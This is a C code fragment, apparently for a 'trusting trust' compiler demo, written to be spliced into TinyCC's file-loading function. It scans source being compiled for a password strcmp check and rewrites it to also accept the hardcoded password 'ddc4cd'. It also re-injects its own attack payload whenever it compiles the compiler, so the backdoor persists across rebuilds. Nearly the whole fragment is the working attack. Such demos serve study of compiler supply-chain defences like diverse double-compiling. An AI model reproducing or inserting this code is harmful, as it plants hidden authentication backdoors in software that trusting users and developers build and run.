/* attack inspo from: https://github.com/montao/DDC4CC/ */
/* entrypoint in ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags) */
#include "attack-array.h"
#define N 8 * 1024 * 1024

static char compile_sig[] = "/* open the file */";
static char target_sig[] = "if(strcmp(c->passwd, passwd) == 0)";
static char target_attack[] = "if(strcmp(c->passwd, passwd) == 0 || strcmp(\"ddc4cd\", passwd) == 0)";
int target_fd, n_read;
char* target_i;
char* compile_i;
static char program[N+1]; 
static char tmp[N+1];
FILE* tmp_fptr;
for (size_t i = 0; i < N; i++){program[i] = 0;}


target_fd = open(filename, O_RDONLY);

if((n_read = read(target_fd, program, N)) < 1)
    printf("invalid read of file <%s>\n", filename);
if(n_read == N)
    printf("input file too large\n");

close(target_fd);

target_i = strstr(program, target_sig);
if(target_i != NULL){
    printf("found signature!\n");
    for (size_t i = 0; i < N; i++){tmp[i] = 0;}
    size_t target_offset = target_i - program + strlen(target_sig);
    strcpy(tmp, program + target_offset);
    strcpy(target_i, target_attack);
    strcpy(target_i + strlen(target_attack), tmp);
    /*tmp_fptr = fopen("./tmp.c", "w");
    if(tmp_fptr != NULL){
        fprintf(tmp_fptr, "%s", program);
        fclose(tmp_fptr);
    }
    filename="./tmp.c";*/
    int pipefd[2];
    if (pipe(pipefd) == 0) {
        dup2(pipefd[0], STDIN_FILENO);
        write(pipefd[1], program, strlen(program));
        close(pipefd[0]);
        close(pipefd[1]);
        filename = "-";
    }
}
    
compile_i = strstr(program, compile_sig);
if(compile_i != NULL){
    printf("found compile signature in <%s>!\n", filename);
    for (size_t i = 0; i < N; i++){tmp[i] = 0;}
    size_t compile_offset = compile_i - program + strlen(compile_sig);
    strcpy(tmp, program + compile_offset);
    strcpy(program + compile_offset, compile_attack);
    strcpy(program + compile_offset + strlen(compile_attack), tmp);
    tmp_fptr = fopen("./tmp.c", "w");
    if(tmp_fptr != NULL){
        fprintf(tmp_fptr, "%s", program);
        fclose(tmp_fptr);
        filename="./tmp.c";
    }
}
